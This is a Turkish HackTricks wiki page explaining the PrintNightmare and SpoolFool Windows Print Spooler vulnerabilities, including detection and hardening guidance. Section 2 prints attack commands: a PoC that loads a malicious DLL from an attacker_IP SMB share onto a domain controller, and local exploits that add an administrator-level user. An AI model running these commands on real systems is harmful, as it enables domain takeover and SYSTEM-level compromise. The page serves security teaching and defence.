# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare, Windows **Print Spooler** hizmetindeki, **SYSTEM olarak rastgele kod yürütme** ve spooler RPC üzerinden erişilebilir olduğunda, **alan denetleyicileri ve dosya sunucularında uzaktan kod yürütme (RCE)** sağlayan bir dizi güvenlik açığına verilen ortak isimdir. En yaygın istismar edilen CVE'ler **CVE-2021-1675** (ilk olarak LPE olarak sınıflandırılmıştır) ve **CVE-2021-34527** (tam RCE)dir. **CVE-2021-34481 (“Point & Print”)** ve **CVE-2022-21999 (“SpoolFool”)** gibi sonraki sorunlar, saldırı yüzeyinin hala kapalı olmadığını kanıtlamaktadır.

---

## 1. Güvenlik açığı olan bileşenler & CVE'ler

| Yıl | CVE | Kısa isim | Primitive | Notlar |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Haziran 2021 CU'da yamanmış ancak CVE-2021-34527 tarafından atlatılmıştır|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx, kimlik doğrulaması yapılmış kullanıcıların uzaktan bir paylaşımdan bir sürücü DLL'si yüklemesine izin verir|
|2021|CVE-2021-34481|“Point & Print”|LPE|Yönetici olmayan kullanıcılar tarafından imzasız sürücü kurulumu|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Rastgele dizin oluşturma → DLL yerleştirme – 2021 yamalarından sonra çalışır|

Hepsi, **MS-RPRN / MS-PAR RPC yöntemlerinden** birini (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) veya **Point & Print** içindeki güven ilişkilerini istismar etmektedir.

## 2. İstismar teknikleri

### 2.1 Uzaktan Alan Denetleyicisi ele geçirme (CVE-2021-34527)

Kimlik doğrulaması yapılmış ancak **yetkisiz** bir alan kullanıcısı, aşağıdaki yöntemle uzaktaki bir spooler'da (**NT AUTHORITY\SYSTEM** olarak) rastgele DLL'ler çalıştırabilir:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popüler PoC'ler arasında **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) ve Benjamin Delpy’nin **mimikatz** içindeki `misc::printnightmare / lsa::addsid` modülleri bulunmaktadır.

### 2.2 Yerel ayrıcalık yükseltme (desteklenen tüm Windows, 2021-2024)

Aynı API, `C:\Windows\System32\spool\drivers\x64\3\` konumundan bir sürücü yüklemek için **yerel** olarak çağrılabilir ve SYSTEM ayrıcalıkları elde edilebilir:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – 2021 düzeltmelerini atlama

Microsoft’un 2021 yamanmaları uzaktan sürücü yüklemeyi engelledi ancak **dizin izinlerini güçlendirmedi**. SpoolFool, `C:\Windows\System32\spool\drivers\` altında keyfi bir dizin oluşturmak için `SpoolDirectory` parametresini kullanır, bir payload DLL bırakır ve spooler'ı bunu yüklemeye zorlar:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit, Şubat 2022 güncellemelerinden önce tam yamanmış Windows 7 → Windows 11 ve Server 2012R2 → 2022 üzerinde çalışır.

---

## 3. Tespit & avlanma

* **Olay Günlükleri** – *Microsoft-Windows-PrintService/Operational* ve *Admin* kanallarını etkinleştirerek **Olay ID 808** “Yazıcı sıralayıcı bir eklenti modülünü yüklemeyi başaramadı” veya **RpcAddPrinterDriverEx** mesajlarını izleyin.
* **Sysmon** – `Event ID 7` (Görüntü yüklendi) veya `11/23` (Dosya yazma/silme) `C:\Windows\System32\spool\drivers\*` içinde, ebeveyn süreç **spoolsv.exe** olduğunda.
* **Süreç soy ağacı** – **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell veya herhangi bir imzasız ikili dosya başlattığında uyarılar.

## 4. Azaltma & güçlendirme

1. **Yamanlayın!** – Print Spooler hizmetinin yüklü olduğu her Windows ana bilgisayarında en son toplu güncellemeyi uygulayın.
2. **Gerekmediği yerlerde sıralayıcıyı devre dışı bırakın**, özellikle Alan Denetleyicilerinde:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Uzaktan bağlantıları engelleyin** ancak yerel yazdırmaya izin verin – Grup İlkesi: `Bilgisayar Yapılandırması → Yönetim Şablonları → Yazıcılar → Yazıcı Sıralayıcısının istemci bağlantılarını kabul etmesine izin ver = Devre Dışı`.
4. **Point & Print'i kısıtlayın** böylece yalnızca yöneticilerin sürücü eklemesine izin verin, kayıt defteri değerini ayarlayarak:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Detaylı rehberlik için Microsoft KB5005652

---

## 5. İlgili araştırmalar / araçlar

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modülleri
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool exploit & yazım
* SpoolFool ve diğer sıralayıcı hataları için 0patch mikropatch'leri

---

**Daha fazla okuma (dış):** 2024 yürüyüş blog yazısını kontrol edin – [PrintNightmare Açığını Anlamak](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Referanslar

* Microsoft – *KB5005652: Yeni Point & Print varsayılan sürücü yükleme davranışını yönetme*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
